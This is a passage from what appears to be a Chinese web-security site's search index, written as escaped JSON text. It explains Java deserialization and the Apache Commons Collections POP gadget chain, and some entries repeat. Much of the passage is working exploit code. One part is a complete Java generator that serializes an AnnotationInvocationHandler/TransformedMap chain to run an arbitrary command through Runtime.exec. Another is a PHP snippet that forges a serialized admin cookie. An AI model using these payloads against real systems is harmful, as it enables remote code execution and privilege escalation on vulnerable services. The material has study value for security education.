\u90fd\u662f\u53ef\u4ee5\u901a\u8fc7\u5e8f\u5217\u5316\u76f4\u63a5\u6784\u9020\u7684\uff0c\u4e3a\u547d\u4ee4\u6267\u884c\u521b\u9020\u7684\u51b3\u5b9a\u6027\u7684\u6761\u4ef6\u3002 \u7136\u540e\u8981\u60f3\u5229\u7528 InvokerTransformer \u7c7b\u4e2d\u7684 transform() \u6765\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a\u5165\u53e3\u70b9\uff0c\u4f7f\u5f97\u5e94\u7528\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u80fd\u591f\u901a\u8fc7\u4e00\u6761\u8c03\u7528\u94fe\u6765\u89e6\u53d1 InvokerTransformer \u4e2d\u7684 transform() \u63a5\u53e3\u3002 \u7136\u800c\u5728 Apache Commons Collections \u91cc\u786e\u5b9e\u5b58\u5728\u8fd9\u6837\u7684\u8c03\u7528\uff0c\u5176\u4e00\u662f\u4f4d\u4e8e TransformedMap \u7c7b\u4e2d\u7684 checkSetValue() \u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable { ... \u7701\u7565 ... protected Object checkSetValue ( Object value ) { return valueTransformer . transform ( value ); } \u800c TransformedMap \u5b9e\u73b0\u4e86 Map \u63a5\u53e3\uff0c\u800c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u4f1a\u8c03\u7528 valueTransformer.transform(value) \u3002 1 2 3 4 5 6 ... \u7701\u7565 ... public Object setValue ( Object value ) { value = parent . checkSetValue ( value ); return entry . setValue ( value ); } } \u597d\u7684\uff0c\u73b0\u5728\u5df2\u7ecf\u627e\u5230\u4e86\u53cd\u5c04\u8c03\u7528\u7684\u4e0a\u4e00\u6b65\u8c03\u7528\uff0c\u8fd9\u91cc\u4e3a\u4e86\u591a\u6b21\u8fdb\u884c\u591a\u6b21\u53cd\u5c04\u8c03\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u591a\u4e2a InvokerTransformer \u5b9e\u4f8b\u7ea7\u8054\u5728\u4e00\u8d77\u7ec4\u6210\u4e00\u4e2a ChainedTransformer \u5bf9\u8c61\uff0c\u5728\u5176\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u4e00\u4e2a\u7ea7\u8054 transform() \u8c03\u7528\uff1a 1 2 3 4 5 6 7 8 public class ChainedTransformer implements Transformer, Serializable { ...\u7701\u7565... public Object transform(Object object) { for (int i = 0; i < iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } \u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u9020\u51fa\u4e00\u4e2a TransformedMap \u5b9e\u4f8b\uff0c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u5019\u8c03\u6211\u4eec\u6784\u9020\u7684 ChainedTransformer \uff0c\u4e0b\u9762\u7ed9\u51fa\u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package exserial.examples ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.TransformedMap ; import java.util.HashMap ; import java.util.Map ; public class SetValueToExec { public static void main ( String [] args ) throws Exception { String command = ( args . length != 0 ) ? args [ 0 ] : \"/bin/sh,-c,open /Applications/Calculator.app\" ; String [] execArgs = command . split ( \",\" ); Transformer [] transforms = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class []. class }, new Object [] { \"getRuntime\" , new Class [ 0 ]} ), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object []. class }, new Object [] { null , new Object [ 0 ]} ), new InvokerTransformer ( \"exec\" , new Class [] { String []. class }, new Object [] { execArgs } ) }; Transformer transformerChain = new ChainedTransformer ( transforms ); Map tempMap = new HashMap < String , Object >(); Map < String , Object > exMap = TransformedMap . decorate ( tempMap , null , transformerChain ); exMap . put ( \"1111\" , \"2222\" ); for ( Map . Entry < String , Object > exMapValue : exMap . entrySet ()) { exMapValue . setValue ( 1 ); } } } \u6839\u636e\u4e4b\u524d\u7684\u5206\u6790\uff0c\u5c06\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7f16\u8bd1\u8fd0\u884c\u540e\u4f1a\u9ed8\u8ba4\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\uff0c\u5bf9\u4ee3\u7801\u8be6\u7ec6\u6267\u884c\u8fc7\u7a0b\u6709\u7591\u60d1\u7684\u53ef\u4ee5\u901a\u8fc7\u5355\u6b65\u8c03\u8bd5\u8fdb\u884c\u6d4b\u8bd5\uff1a \u7136\u540e\u6211\u4eec\u73b0\u5728\u53ea\u662f\u6d4b\u8bd5\u4e86\u4f7f\u7528 TransformedMap \u8fdb\u884c\u4efb\u610f\u547d\u4ee4\u6267\u884c\u800c\u5df2\uff0c\u8981\u60f3\u5728 Java \u5e94\u7528\u53cd\u5e8f\u5217\u5316\u7684\u8fc7\u7a0b\u4e2d\u89e6\u53d1\u8be5\u8fc7\u7a0b\u8fd8\u9700\u8981\u627e\u5230\u4e00\u4e2a\u7c7b\uff0c\u5b83\u80fd\u591f\u5728\u53cd\u5e8f\u5217\u5316\u8c03\u7528 readObject() \u7684\u65f6\u5019\u8c03\u7528 TransformedMap \u5185\u7f6e\u7c7b MapEntry \u4e2d\u7684 setValue() \u51fd\u6570\uff0c\u8fd9\u6837\u624d\u80fd\u6784\u6210\u4e00\u6761\u5b8c\u6574\u7684 Gadget \u8c03\u7528\u94fe\u3002\u6070\u597d\u5728 sun.reflect.annotation.AnnotationInvocationHandler \u7c7b\u5177\u6709 Map \u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5e76\u4e14\u5728 readObject() \u65b9\u6cd5\u4e2d\u89e6\u53d1\u4e86\u4e0a\u9762\u6240\u63d0\u5230\u7684\u6240\u6709\u6761\u4ef6\uff0c\u5176\u6e90\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 private void readObject(java.io.ObjectInputStream s) { ...\u7701\u7565... for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) { String name = memberValue.getKey(); Class<?> memberType = memberTypes.get(name); if (memberType != null) { // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) { memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(value.getClass() + \"[\" + value + \"]\").setMember(annotationType.members().get(name))); } } } } \u53ef\u4ee5\u6ce8\u610f\u5230 memberValue \u662f AnnotationInvocationHandler \u7c7b\u4e2d\u7c7b\u578b\u58f0\u660e\u4e3a Map<String, Object> \u7684\u6210\u5458\u53d8\u91cf\uff0c\u521a\u597d\u548c\u4e4b\u524d\u6784\u9020\u7684 TransformedMap \u7c7b\u578b\u76f8\u7b26\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 Java \u7684\u53cd\u5c04\u673a\u5236\u52a8\u6001\u7684\u83b7\u53d6 AnnotationInvocationHandler \u7c7b\uff0c\u4f7f\u7528\u7cbe\u5fc3\u6784\u9020\u597d\u7684 TransformedMap \u4f5c\u4e3a\u5b83\u7684\u5b9e\u4f8b\u5316\u53c2\u6570\uff0c\u7136\u540e\u5c06\u5b9e\u4f8b\u5316\u7684 AnnotationInvocationHandler \u8fdb\u884c\u5e8f\u5217\u5316\u5f97\u5230\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u6700\u540e\u4f20\u9012\u7ed9\u5177\u6709\u76f8\u5e94\u73af\u5883\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u4f7f\u4e4b\u89e6\u53d1\u547d\u4ee4\u6267\u884c\u7684 Gadget\uff0c\u5b8c\u6574\u4ee3\u7801\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 package exserial.payloads; import java.io.ObjectOutputStream; import java.util.Map; import java.util.HashMap; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.map.TransformedMap; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import exserial.payloads.utils.Serializables; public class Commons1 { public static Object getAnnotationInvocationHandler(String command) throws Exception { String[] execArgs = command.split(\",\"); Transformer[] transforms = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer( \"getMethod\", new Class[] {String.class, Class[].class}, new Object[] {\"getRuntime\", new Class[0]} ), new InvokerTransformer( \"invoke\", new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0]} ), new InvokerTransformer( \"exec\", new Class[] {String[].class}, new Object[] {execArgs} ) }; Transformer transformerChain = new ChainedTransformer(transforms); Map tempMap = new HashMap(); tempMap.put(\"value\", \"does't matter\"); Map exMap = TransformedMap.decorate(tempMap, null, transformerChain); Class cls = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor ctor = cls.getDeclaredConstructor(Class.class, Map.class); ctor.setAccessible(true); Object instance = ctor.newInstance(Target.class, exMap); return instance; } public static void main(String[] args) throws Exception { String command = (args.length != 0) ? args[0] : \"/bin/sh,-c,open /Applications/Calculator.app\"; Object obj = getAnnotationInvocationHandler(command); ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(obj); } } \u6700\u7ec8\u7528\u4e00\u6bb5\u8c03\u7528\u94fe\u53ef\u4ee5\u6e05\u6670\u7684\u63cf\u8ff0\u6574\u4e2a\u547d\u4ee4\u6267\u884c\u7684\u89e6\u53d1\u8fc7\u7a0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 /* Gadget chain: ObjectInputStream.readObject() AnnotationInvocationHandler.readObject() AbstractInputCheckedMapDecorator$MapEntry.setValue() TransformedMap.checkSetValue() ConstantTransformer.transform() InvokerTransformer.transform() Method.invoke() Class.getMethod() InvokerTransformer.transform() Method.invoke() Runtime.getRuntime() InvokerTransformer.transform() Method.invoke() Runtime.exec() Requires: commons-collections <= 3.2.1 */ \u53c2\u8003 \u00b6 \u4e4c\u4e91","title":"\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u547d\u4ee4\u6267\u884c - Java \u4e2d\u7684 POP \u6267\u884c\u94fe"},{"location":"web_sec/audit/java/#-java-pop","text":"\u5e8f\u5217\u5316\u5e38\u7528\u4e8e\u5c06\u7a0b\u5e8f\u8fd0\u884c\u65f6\u7684\u5bf9\u8c61\u72b6\u6001\u4ee5\u4e8c\u8fdb\u5236\u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u6587\u4ef6\u7cfb\u7edf\u4e2d\uff0c\u7136\u540e\u53ef\u4ee5\u5728\u53e6\u4e00\u4e2a\u7a0b\u5e8f\u4e2d\u5bf9\u5e8f\u5217\u5316\u540e\u7684\u5bf9\u8c61\u72b6\u6001\u6570\u636e\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u6062\u590d\u5bf9\u8c61\u3002\u7b80\u5355\u7684\u8bf4\u5c31\u662f\u53ef\u4ee5\u57fa\u4e8e\u5e8f\u5217\u5316\u6570\u636e\u5b9e\u65f6\u5728\u4e24\u4e2a\u7a0b\u5e8f\u4e2d\u4f20\u9012\u7a0b\u5e8f\u5bf9\u8c61\u3002 \u5728\u7b2c\u4e00\u6bb5\u4ee3\u7801\u91cc\u9762\uff0c\u7a0b\u5e8f\u5c06\u5b9e\u4f8b\u5bf9\u8c61 String(\"This is String object!\") \u901a\u8fc7 ObjectOutputStream \u7c7b\u7684 writeObject() \u51fd\u6570\u5199\u5230\u4e86\u6587\u4ef6\u91cc\u3002\u5e8f\u5217\u5316\u5bf9\u8c61\u5728\u5177\u6709\u4e00\u5b9a\u7684\u4e8c\u8fdb\u5236\u7ed3\u6784\uff0c\u4ee5\u5341\u516d\u8fdb\u5236\u683c\u5f0f\u67e5\u770b\u5b58\u50a8\u4e86\u5e8f\u5217\u5316\u5bf9\u8c61\u7684\u6587\u4ef6\uff0c\u9664\u4e86\u5305\u542b\u4e00\u4e9b\u5b57\u7b26\u4e32\u5e38\u91cf\u4ee5\u5916\uff0c\u8fd8\u80fd\u770b\u5230\u5176\u5177\u6709\u4e0d\u53ef\u6253\u5370\u7684\u5b57\u7b26\u5728\u91cc\u9762\uff0c\u800c\u8fd9\u4e9b\u5b57\u7b26\u5c31\u662f\u7528\u6765\u63cf\u8ff0\u5176\u5e8f\u5217\u5316\u7ed3\u6784\u7684\u3002","title":"\u4ece\u53cd\u5e8f\u5217\u5316\u5230\u547d\u4ee4\u6267\u884c - Java \u4e2d\u7684 POP \u6267\u884c\u94fe"},{"location":"web_sec/audit/java/#java","text":"\u5728\u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u4e2d\uff0c\u59344\u4e2a\u5b57\u8282\u5b58\u50a8\u7684\u662f Java \u5e8f\u5217\u5316\u5bf9\u8c61\u6570\u636e\u7279\u6709\u7684 Magic Number \u548c\u76f8\u5e94\u7684\u534f\u8bae\u7248\u672c\uff0c\u901a\u5e38\u4e3a\uff1a 1 2 0xaced (Magic Number) 0x0005 (Version Number) \u5728\u5177\u4f53\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u4f1a\u9075\u5faa\u5e8f\u5217\u5316\u534f\u8bae\u8fdb\u884c\u6570\u636e\u5c01\u88c5. \u5217\u5316\u540e\u7684 Java \u5bf9\u8c61\u4e8c\u8fdb\u5236\u6570\u636e\u901a\u5e38\u4ee5 0xaced0005 \u8fd9 4 \u4e2a\u5b57\u8282\u5f00\u59cb\u5c31\u53ef\u4ee5\u4e86\u3002\u5bf9 Java \u5e94\u7528\u5e8f\u5217\u5316\u5bf9\u8c61\u4ea4\u4e92\u7684\u63a5\u53e3\u5bfb\u627e\u5c31\u53ef\u4ee5\u901a\u8fc7\u76d1\u6d4b\u8fd9 4 \u4e2a\u7279\u6b8a\u5b57\u8282\u6765\u8fdb\u884c\u3002 \u5728 Java \u91cc\uff0c\u53ef\u4ee5\u5e8f\u5217\u5316\u4e00\u4e2a\u5bf9\u8c61\u6210\u4e3a\u5177\u6709\u4e00\u5b9a\u6570\u636e\u683c\u5f0f\u7684\u4e8c\u8fdb\u5236\u6570\u636e\uff0c\u4e5f\u53ef\u4ee5\u4ece\u6570\u636e\u6d41\u7a0b\u4e2d\u6062\u590d\u4e00\u4e2a\u5b9e\u4f8b\u5bf9\u8c61\u3002\u800c\u8fdb\u884c\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u65f6\u4f1a\u4f7f\u7528\u4e24\u4e2a\u7c7b\uff0c\u5982\u4e0b\uff1a 1 2 3 4 5 6 7 8 9 10 11 // \u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectOutputStream writeObject () writeUnshared () ... // \u53cd\u5e8f\u5217\u5316\u5bf9\u8c61 java . io . ObjectInputStream readObject () readUnshared () ... \u4e5f\u53ef\u4ee5\u5728\u5bf9\u8c61\u4e2d\u91cd\u5199 writeObject() \u548c readObject() \u51fd\u6570\uff0c\u6765\u8fdb\u884c\u4e00\u4e9b\u7279\u6b8a\u7684\u72b6\u6001\u548c\u6570\u636e\u7684\u63a7\u5236\u3002 \u5982\u679c\u6211\u4eec\u9700\u8981\u5bfb\u627e\u67d0\u4e2a Java \u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u65f6\uff0c\u5c31\u53ef\u4ee5\u76f4\u63a5\u8fdb\u884c\u5168\u5c40\u4ee3\u7801\u641c\u7d22\u5e8f\u5217\u5316\u548c\u53cd\u5e8f\u5217\u5316\u4e2d\u5e38\u7528\u7684\u90a3\u4e9b\u51fd\u6570\u548c\u65b9\u6cd5\uff0c\u5f53\u627e\u5230 Java \u5e94\u7528\u7684\u5e8f\u5217\u5316\u6570\u636e\u4ea4\u4e92\u63a5\u53e3\u540e\uff0c\u4fbf\u53ef\u4ee5\u5f00\u59cb\u8003\u8651\u5177\u4f53\u7684\u5229\u7528\u65b9\u6cd5\u4e86\u3002","title":"Java \u5e8f\u5217\u5316\u7279\u5f81"},{"location":"web_sec/audit/java/#_1","text":"\u4e0b\u9762\u662f\u4e00\u6bb5\u4ee3\u7801\u662f PHP \u4ee3\u7801\u4e2d\u5c06\u5e8f\u5217\u5316\u6570\u636e\u4ee5 Cookie \u5f62\u5f0f\u5b58\u50a8\u7684\u5b9e\u4f8b\uff08user.php\uff09\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 <?php class User { public $username = '' ; private $is_admin = false ; function __construct ( $username ) { $this -> username = $username ; } function isAdmin () { return $this -> is_admin ; } } function initUser () { $user = new User ( 'Guest' ); $data = base64_encode ( serialize ( $user )); setCookie ( 'user' , $data , time () + 3600 ); echo '<script>location.href=\"./user.php\"</script>' ; } if ( isset ( $_COOKIE [ 'user' ])) { $user = unserialize ( base64_decode ( $_COOKIE [ 'user' ])); if ( $user ) { if ( $user -> isAdmin ()) { echo 'Welcome Come Back, Admninistrator.' ; } else { echo \"Hello, $user->username .\" ; } } else { initUser (); } } else { initUser (); } \u8fd9\u6bb5\u4ee3\u7801\u5c06\u7528\u6237\u4fe1\u606f\u4ee5 base64_encode(serialize($user)) \u7684\u5f62\u5f0f\u5b58\u50a8\u4e8e\u5ba2\u6237\u7aef\u7684 $_COOKIE['data'] \u91cc\uff0c\u5bf9\u5e8f\u5217\u5316\u654f\u611f\u7684\u90fd\u77e5\u9053\u53ef\u4ee5\u81ea\u5df1\u6784\u9020\u5e8f\u5217\u5316\u5185\u5bb9\u7136\u540e\u4f20\u9012\u7ed9\u670d\u52a1\u7aef\uff0c\u4f7f\u5176\u6539\u53d8\u4ee3\u7801\u903b\u8f91\u3002\u4f7f\u7528\u4e0b\u9762\u8fd9\u6bb5\u4ee3\u7801\u751f\u6210 $is_admin = true \u7684\u7528\u6237\u4fe1\u606f\uff1a 1 2 3 4 5 6 7 <?php class User { public $username = 'Guest' ; private $is_admin = true ; } echo base64_encode ( serialize ( new User ())); \u7528\u751f\u6210\u597d\u7684 Payload \u4fee\u6539 Cookie \u540e\u518d\u6b21\u8bbf\u95ee\u5373\u53ef\u770b\u5230 Welcome Come Back, Admninistrator. \u7684\u8f93\u51fa\u4fe1\u606f\u3002 Java \u4e2d\u4e5f\u53ef\u4ee5\u5229\u7528\u53cd\u5e8f\u5217\u5316\u63a7\u5236\u4ee3\u7801\u6d41\u7a0b\uff08\u4f20\u64ad\u7684\u6bd5\u7adf\u662f\u4e00\u4e2a\u5bf9\u8c61\u5b9e\u4f8b\uff09\uff0c \u4f46\u5728 Java \u4e2d\u60f3\u8981\u968f\u4fbf\u53cd\u5e8f\u5217\u5316\u4e00\u4e2a\u7c7b\u5b9e\u4f8b\u662f\u4e0d\u884c\u7684\uff0c\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u7684\u7c7b\u5fc5\u987b\u663e\u793a\u58f0\u660e Serializable \u63a5\u53e3\uff0c\u8fd9\u6837\u624d\u5141\u8bb8\u8fdb\u884c\u5e8f\u5217\u5316\u64cd\u4f5c\u3002","title":"\u53cd\u5e8f\u5217\u5316\u7684\u5371\u5bb3"},{"location":"web_sec/audit/java/#_2","text":"\u9762\u5411\u5c5e\u6027\u7f16\u7a0b\uff08Property-Oriented Programing\uff09\u5e38\u7528\u4e8e\u4e0a\u5c42\u8bed\u8a00\u6784\u9020\u7279\u5b9a\u8c03\u7528\u94fe\u7684\u65b9\u6cd5\uff0c\u4e0e\u4e8c\u8fdb\u5236\u5229\u7528\u4e2d\u7684\u9762\u5411\u8fd4\u56de\u7f16\u7a0b\uff08Return-Oriented Programing\uff09\u7684\u539f\u7406\u76f8\u4f3c\uff0c\u90fd\u662f\u4ece\u73b0\u6709\u8fd0\u884c\u73af\u5883\u4e2d\u5bfb\u627e\u4e00\u7cfb\u5217\u7684\u4ee3\u7801\u6216\u8005\u6307\u4ee4\u8c03\u7528\uff0c\u7136\u540e\u6839\u636e\u9700\u6c42\u6784\u6210\u4e00\u7ec4\u8fde\u7eed\u7684\u8c03\u7528\u94fe\u3002\u5728\u63a7\u5236\u4ee3\u7801\u6216\u8005\u7a0b\u5e8f\u7684\u6267\u884c\u6d41\u7a0b\u540e\u5c31\u80fd\u591f\u4f7f\u7528\u8fd9\u4e00\u7ec4\u8c03\u7528\u94fe\u505a\u4e00\u4e9b\u5de5\u4f5c\u4e86\u3002","title":"\u9762\u5411\u5c5e\u6027\u7f16\u7a0b"},{"location":"web_sec/audit/java/#java_1","text":"InvokerTransformer.transform() \u53cd\u5c04\u8c03\u7528 \u5728\u4f7f\u7528 Apache Commons Collections \u5e93\u8fdb\u884c Gadget \u6784\u9020\u65f6\u4e3b\u8981\u5229\u7528\u4e86\u5176 Transformer \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 public interface Transformer { /** * Transforms the input object (leaving it unchanged) into some output object. * * @param input the object to be transformed, should be left unchanged * @return a transformed object * @throws ClassCastException (runtime) if the input is the wrong class * @throws IllegalArgumentException (runtime) if the input is invalid * @throws FunctorException (runtime) if the transform cannot be completed */ public Object transform ( Object input ); } \u4e3b\u8981\u7528\u4e8e\u5c06\u4e00\u4e2a\u5bf9\u8c61\u901a\u8fc7 transform \u65b9\u6cd5\u8f6c\u6362\u4e3a\u53e6\u4e00\u4e2a\u5bf9\u8c61\uff0c\u800c\u5728\u5e93\u4e2d\u4f17\u591a\u5bf9\u8c61\u8f6c\u6362\u7684\u63a5\u53e3\u4e2d\u5b58\u5728\u4e00\u4e2a Invoker \u7c7b\u578b\u7684\u8f6c\u6362\u63a5\u53e3 InvokerTransformer \uff0c\u5e76\u4e14\u540c\u65f6\u8fd8\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class InvokerTransformer implements Transformer , Serializable { ... \u7701\u7565 ... private final String iMethodName ; private final Class [] iParamTypes ; private final Object [] iArgs ; public Object transform ( Object input ) { if ( input == null ) { return null ; } try { Class cls = input . getClass (); // \u53cd\u5c04\u83b7\u53d6\u7c7b Method method = cls . getMethod ( iMethodName , iParamTypes ); // \u53cd\u5c04\u5f97\u5230\u5177\u6709\u5bf9\u5e94\u53c2\u6570\u7684\u65b9\u6cd5 return method . invoke ( input , iArgs ); // \u4f7f\u7528\u5bf9\u5e94\u53c2\u6570\u8c03\u7528\u65b9\u6cd5\uff0c\u5e76\u8fd4\u56de\u76f8\u5e94\u8c03\u7528\u7ed3\u679c } catch ( NoSuchMethodException ex ) { ... \u7701\u7565 ... \u53ef\u4ee5\u770b\u5230 InvokerTransformer \u7c7b\u4e2d\u5b9e\u73b0\u7684 transform() \u63a5\u53e3\u4f7f\u7528 Java \u53cd\u5c04\u673a\u5236\u83b7\u53d6\u53cd\u5c04\u5bf9\u8c61 input \u4e2d\u7684\u53c2\u6570\u7c7b\u578b\u4e3a iParamTypes \u7684\u65b9\u6cd5 iMethodName \uff0c\u7136\u540e\u4f7f\u7528\u5bf9\u5e94\u53c2\u6570 iArgs \u8c03\u7528\u83b7\u53d6\u7684\u65b9\u6cd5\uff0c\u5e76\u5c06\u6267\u884c\u7ed3\u679c\u8fd4\u56de\u3002\u7531\u4e8e\u5176\u5b9e\u73b0\u4e86 Serializable \u63a5\u53e3\uff0c\u56e0\u6b64\u5176\u4e2d\u7684\u4e09\u4e2a\u5fc5\u8981\u53c2\u6570 iMethodName \u3001 iParamTypes \u548c iArgs \u90fd\u662f\u53ef\u4ee5\u901a\u8fc7\u5e8f\u5217\u5316\u76f4\u63a5\u6784\u9020\u7684\uff0c\u4e3a\u547d\u4ee4\u6267\u884c\u521b\u9020\u7684\u51b3\u5b9a\u6027\u7684\u6761\u4ef6\u3002 \u7136\u540e\u8981\u60f3\u5229\u7528 InvokerTransformer \u7c7b\u4e2d\u7684 transform() \u6765\u8fbe\u5230\u4efb\u610f\u547d\u4ee4\u6267\u884c\uff0c\u8fd8\u9700\u8981\u4e00\u4e2a\u5165\u53e3\u70b9\uff0c\u4f7f\u5f97\u5e94\u7528\u5728\u53cd\u5e8f\u5217\u5316\u7684\u65f6\u5019\u80fd\u591f\u901a\u8fc7\u4e00\u6761\u8c03\u7528\u94fe\u6765\u89e6\u53d1 InvokerTransformer \u4e2d\u7684 transform() \u63a5\u53e3\u3002 \u7136\u800c\u5728 Apache Commons Collections \u91cc\u786e\u5b9e\u5b58\u5728\u8fd9\u6837\u7684\u8c03\u7528\uff0c\u5176\u4e00\u662f\u4f4d\u4e8e TransformedMap \u7c7b\u4e2d\u7684 checkSetValue() \u65b9\u6cd5\uff1a 1 2 3 4 5 6 7 public class TransformedMap extends AbstractInputCheckedMapDecorator implements Serializable { ... \u7701\u7565 ... protected Object checkSetValue ( Object value ) { return valueTransformer . transform ( value ); } \u800c TransformedMap \u5b9e\u73b0\u4e86 Map \u63a5\u53e3\uff0c\u800c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u4f1a\u8c03\u7528 valueTransformer.transform(value) \u3002 1 2 3 4 5 6 ... \u7701\u7565 ... public Object setValue ( Object value ) { value = parent . checkSetValue ( value ); return entry . setValue ( value ); } } \u597d\u7684\uff0c\u73b0\u5728\u5df2\u7ecf\u627e\u5230\u4e86\u53cd\u5c04\u8c03\u7528\u7684\u4e0a\u4e00\u6b65\u8c03\u7528\uff0c\u8fd9\u91cc\u4e3a\u4e86\u591a\u6b21\u8fdb\u884c\u591a\u6b21\u53cd\u5c04\u8c03\u7528\uff0c\u6211\u4eec\u53ef\u4ee5\u5c06\u591a\u4e2a InvokerTransformer \u5b9e\u4f8b\u7ea7\u8054\u5728\u4e00\u8d77\u7ec4\u6210\u4e00\u4e2a ChainedTransformer \u5bf9\u8c61\uff0c\u5728\u5176\u8c03\u7528\u7684\u65f6\u5019\u4f1a\u8fdb\u884c\u4e00\u4e2a\u7ea7\u8054 transform() \u8c03\u7528\uff1a 1 2 3 4 5 6 7 8 public class ChainedTransformer implements Transformer, Serializable { ...\u7701\u7565... public Object transform(Object object) { for (int i = 0; i < iTransformers.length; i++) { object = iTransformers[i].transform(object); } return object; } \u73b0\u5728\u5df2\u7ecf\u53ef\u4ee5\u9020\u51fa\u4e00\u4e2a TransformedMap \u5b9e\u4f8b\uff0c\u5728\u5bf9\u5b57\u5178\u952e\u503c\u8fdb\u884c setValue() \u64cd\u4f5c\u65f6\u5019\u8c03\u6211\u4eec\u6784\u9020\u7684 ChainedTransformer \uff0c\u4e0b\u9762\u7ed9\u51fa\u793a\u4f8b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 package exserial.examples ; import org.apache.commons.collections.Transformer ; import org.apache.commons.collections.functors.ChainedTransformer ; import org.apache.commons.collections.functors.ConstantTransformer ; import org.apache.commons.collections.functors.InvokerTransformer ; import org.apache.commons.collections.map.TransformedMap ; import java.util.HashMap ; import java.util.Map ; public class SetValueToExec { public static void main ( String [] args ) throws Exception { String command = ( args . length != 0 ) ? args [ 0 ] : \"/bin/sh,-c,open /Applications/Calculator.app\" ; String [] execArgs = command . split ( \",\" ); Transformer [] transforms = new Transformer [] { new ConstantTransformer ( Runtime . class ), new InvokerTransformer ( \"getMethod\" , new Class [] { String . class , Class []. class }, new Object [] { \"getRuntime\" , new Class [ 0 ]} ), new InvokerTransformer ( \"invoke\" , new Class [] { Object . class , Object []. class }, new Object [] { null , new Object [ 0 ]} ), new InvokerTransformer ( \"exec\" , new Class [] { String []. class }, new Object [] { execArgs } ) }; Transformer transformerChain = new ChainedTransformer ( transforms ); Map tempMap = new HashMap < String , Object >(); Map < String , Object > exMap = TransformedMap . decorate ( tempMap , null , transformerChain ); exMap . put ( \"1111\" , \"2222\" ); for ( Map . Entry < String , Object > exMapValue : exMap . entrySet ()) { exMapValue . setValue ( 1 ); } } } \u6839\u636e\u4e4b\u524d\u7684\u5206\u6790\uff0c\u5c06\u4e0a\u9762\u8fd9\u6bb5\u4ee3\u7801\u7f16\u8bd1\u8fd0\u884c\u540e\u4f1a\u9ed8\u8ba4\u4f1a\u5f39\u51fa\u8ba1\u7b97\u5668\uff0c\u5bf9\u4ee3\u7801\u8be6\u7ec6\u6267\u884c\u8fc7\u7a0b\u6709\u7591\u60d1\u7684\u53ef\u4ee5\u901a\u8fc7\u5355\u6b65\u8c03\u8bd5\u8fdb\u884c\u6d4b\u8bd5\uff1a \u7136\u540e\u6211\u4eec\u73b0\u5728\u53ea\u662f\u6d4b\u8bd5\u4e86\u4f7f\u7528 TransformedMap \u8fdb\u884c\u4efb\u610f\u547d\u4ee4\u6267\u884c\u800c\u5df2\uff0c\u8981\u60f3\u5728 Java 